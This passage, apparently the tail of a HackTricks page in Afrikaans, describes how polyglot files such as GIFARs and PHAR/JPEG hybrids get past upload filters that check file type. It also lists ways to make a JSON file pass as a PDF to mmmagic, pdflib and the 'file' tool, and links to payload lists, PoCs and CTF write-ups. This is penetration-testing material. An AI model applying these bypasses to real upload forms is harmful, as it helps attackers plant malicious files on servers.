Polyglot-lêers dien as 'n unieke hulpmiddel in cybersecurity, optreeend soos kameleonne wat geldig in meerdere lêerformate tegelyk kan bestaan. 'n Interessante voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibriede wat beide as 'n GIF en 'n RAR-argief funksioneer. Sulke lêers is nie beperk tot hierdie kombinasie nie; kombinasies soos GIF en JS of PPT en JS is ook haalbaar.

Die kernnutswaarde van polyglot-lêers lê in hul vermoë om sekuriteitsmaatreëls te omseil wat lêers op grond van tipe sifting. Algemene praktyk in verskeie toepassings behels die toelaat van slegs sekere lêertipes vir oplaai—soos JPEG, GIF of DOC—om die risiko wat deur moontlik skadelike formate veroorsaak word (bv. JS, PHP, of Phar-lêers) te verminder. 'n Polyglot kan egter, deur aan die strukturele kriteria van meerdere lêertipes te voldoen, hierdie beperkings heimlik omseil.

Ten spyte van hul aanpasbaarheid, ondervind polyglots beperkings. Byvoorbeeld, terwyl 'n polyglot terselfdertyd 'n PHAR-lêer (PHp ARchive) en 'n JPEG kan beliggaam, kan die sukses van die oplaai afhang van die platform se beleid oor lêeruitbreidings. As die stelsel streng is oor toelaatbare uitbreidings, mag die loutere strukturele tweevoudigheid van 'n polyglot nie voldoende wees om die oplaai te verseker nie.

Meer inligting in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Laai geldige JSON op asof dit 'n PDF is

Hoe om lêertipe-detektering te ontwrig deur 'n geldige JSON-lêer op te laai selfs al is dit nie toegelaat nie deur 'n vals PDF-lêer voor te gee (tegnieke uit **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solank die `%PDF` magic bytes in die eerste 1024 bytes is, is dit geldig (sien voorbeeld in die post)
- **`pdflib` library**: Voeg 'n vals PDF-formaat binne 'n veld van die JSON in sodat die biblioteek dink dit is 'n pdf (sien voorbeeld in die post)
- **`file` binary**: Dit kan tot 1048576 bytes van 'n lêer lees. Skep net 'n JSON wat groter is as dit sodat dit nie die inhoud as 'n JSON kan parse nie en sit dan binne die JSON die aanvanklike deel van 'n regte PDF en dit sal dink dit is 'n PDF

## Verwysings

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
